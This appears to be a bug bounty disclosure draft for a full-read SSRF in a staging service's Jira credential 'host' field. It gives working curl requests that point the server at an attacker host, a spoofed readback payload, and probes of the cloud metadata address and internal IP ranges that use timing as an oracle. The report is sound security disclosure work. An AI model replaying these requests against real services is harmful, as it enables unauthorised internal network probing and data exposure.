# BUG-012 Submission Draft — Full-read SSRF via attacker-controlled Jira credential `host`

**Title:** Full-read SSRF (CWE-918) via unvalidated `data.host` in automation credential creation — authenticated user can make internal integration service fetch arbitrary URLs and read responses back
**Severity:** P2 (SSRF with full readback; internal reachability oracle; IMDSv2 currently blocks credential theft)
**Target:** https://bugbounty1.qe.optrostaging.ai

## Steps to reproduce

1. **Create the credential** (any authenticated user; attacker host is accepted verbatim):

```
curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/automation_credentials" \
  -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System" \
  -H "Content-Type: application/json" \
  -d '{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"https://<attacker-server>/t049e-cred-host","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}'
```

→ 200, note `id`.

2. **Make the attacker server answer** any request with:

```
{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],"self":"https://zx.example","total":1,"maxResults":50,"startAt":0}
```

3. **Trigger + read back:**

```
curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/ticketing/projects?credentialId=<id>" \
  -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System"
```

→ 200 `{"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}` — attacker-supplied values returned as application data.

4. **Internal oracle** — repeat step 1 with `host` = `http://169.254.169.254/latest/meta-data/`, then step 3 → distinct **401 ApiError in ~0.5 s** (IMDS reached; vs 500 generic for refused `127.0.0.1:9002`, vs indefinite hang for blackholed `172.31.0.1`). Verification status is persisted and readable: `GET /api/v1/automation_credentials/<id>` → `last_verified: {"results":[{"status":200}], ...}`.

## Evidence summary

- Server-side requests hit attacker server: `GET <host>/rest/api/3/project/search?startAt=0&maxResults=50` (UA `axios/1.20.0`) and `POST <host>/rest/webhooks/1.0/webhook` (UA `node`) with body leaking internal host `https://integrations.qa.soxhubapp.com/api/v1/jira/credential/<id>/issues/{issue.key}?instanceUrl=https://bugbounty1.qe.optrostaging.ai`.
- No scheme/host/IP validation on `data.host` (link-local, loopback, RFC1918 all accepted).
- Full content readback through the Jira parser; error-code + timing oracle for internal targets; persisted status-code oracle via `last_verified`.

## Impact

Authenticated attacker can pivot an internal Node integration service into a request proxy: full-read SSRF to attacker-controlled hosts, internal service/port discovery from inside the VPC, POST-based SSRF, internal topology disclosure. IMDSv2 blocks instance-credential theft today; app/data-tier RFC1918 targets were blackholed in testing (honest ceiling), but the metadata hop and readback primitive remain P2-grade.

## Notes

- No delete route exists for credentials (DELETE → 404); tester artifacts ids 61–64 (`t049e-zx-probe`, `t049f-*`) remain in the org and should be removed by the vendor.
